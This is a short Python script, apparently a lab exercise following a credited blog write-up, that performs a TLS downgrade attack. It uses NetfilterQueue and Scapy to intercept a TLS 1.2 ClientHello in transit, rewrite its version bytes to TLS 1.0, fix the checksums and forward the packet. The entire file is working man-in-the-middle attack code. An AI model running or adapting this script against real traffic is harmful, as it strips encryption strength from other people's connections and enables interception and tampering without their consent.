#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
#
# Also, thanks to Mike D. for teaching me how to join() to fix
# the bytes for set_payload().
#
# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
# https://tls.ulfheim.net
#

from netfilterqueue import NetfilterQueue
from scapy import *

scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
__builtins__.__dict__.update(scapy_builtins)


nfQueueID         = 0
maxPacketsToStore = 100


def downgradeTLS(packet):
  print("...")
  scapy_packet = IP(packet.get_payload())


  if not scapy_packet.haslayer("Raw"):
    packet.accept();

  else:
    tcpPayload = scapy_packet["Raw"].load

    # Adjusted the matching rules for Python 2 and old Scapy.
    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
      print("TLS handshake found, client HELLO.")
      
      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
        print("TLS v1.2, dropping down to v1.0")
        print("-----")
        print(scapy_packet.summary()) 
        print("-----")
        print(scapy_packet.command()) 
        print("-----")
        print(scapy_packet.show()) 
        print("-----")

        msgBytes = packet.get_payload()        # msgBytes is read-only, copy it
        msgBytes2 = [b for b in msgBytes]

        print("msgB is: ", type(msgBytes))
        print("msgB2 is: ", type(msgBytes2))
        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")
        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")

        msgBytes2[61] = '\x03'
        msgBytes2[62] = '\x01'

        print("Byte 61 is now: ", msgBytes2[61], ".")
        print("Byte 62 is now: ", msgBytes2[62], ".")
        print(msgBytes2[0:65])

        msg=b''.join(msgBytes2)
        packet.set_payload(msg)
        
        msg_tweak = IP(packet.get_payload())
        del msg_tweak["IP"].chksum
        del msg_tweak["TCP"].chksum
        packet.set_payload(bytes(msg_tweak))                        
        
        # Comparing to the original packet
        scapy_packetchk = IP(packet.get_payload())
        print("-----")
        print(scapy_packetchk.command()) 
        print("-----")
        print(scapy_packetchk.show()) 
        print("-----")


      packet.accept()                                                                     
    else:                                                                              
      packet.accept();


print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, downgradeTLS, maxPacketsToStore) # binds to queue 0, use handler "downgradeTLS()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

